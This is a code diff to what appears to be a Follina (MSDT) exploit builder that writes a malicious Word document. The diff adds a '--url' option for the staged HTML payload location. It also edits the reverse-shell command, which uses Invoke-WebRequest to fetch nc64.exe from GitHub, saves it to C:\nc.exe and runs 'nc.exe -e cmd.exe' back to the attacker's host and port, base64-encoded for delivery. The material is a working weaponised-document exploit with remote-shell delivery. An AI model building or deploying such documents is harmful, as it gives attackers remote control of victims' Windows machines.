@@ -25,6 +25,14 @@ parser.add_argument(
 )
 
 parser.add_argument(
+    "--url",
+    "-u",
+    default="url",
+    help="url of the word file",
+)
+
+
+parser.add_argument(
     "--output",
     "-o",
     default="./follina.doc",
@@ -60,6 +68,7 @@ def main(args):
     # Parse the supplied interface
     # This is done so the maldoc knows what to reach out to.
     try:
+        url = args.url
         serve_host = ipaddress.IPv4Address(args.interface)
     except ipaddress.AddressValueError:
         try:
@@ -94,7 +103,7 @@ def main(args):
         external_referral = filp.read()
 
     external_referral = external_referral.replace(
-        "{staged_html}", f"http://{serve_host}:{args.port}/index.html"
+        "{staged_html}", f"{url}/index.html"
     )
 
     with open(document_rels_path, "w") as filp:
@@ -108,7 +117,7 @@ def main(args):
 
     command = args.command
     if args.reverse:
-        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\Windows\\Tasks\\nc.exe; C:\\Windows\\Tasks\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
+        command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob/main/nc64.exe?raw=true -OutFile C:\\nc.exe; C:\\nc.exe -e cmd.exe {serve_host} {args.reverse}"""
 
     # Base64 encode our command so whitespace is respected
     base64_payload = base64.b64encode(command.encode("utf-8")).decode("utf-8")
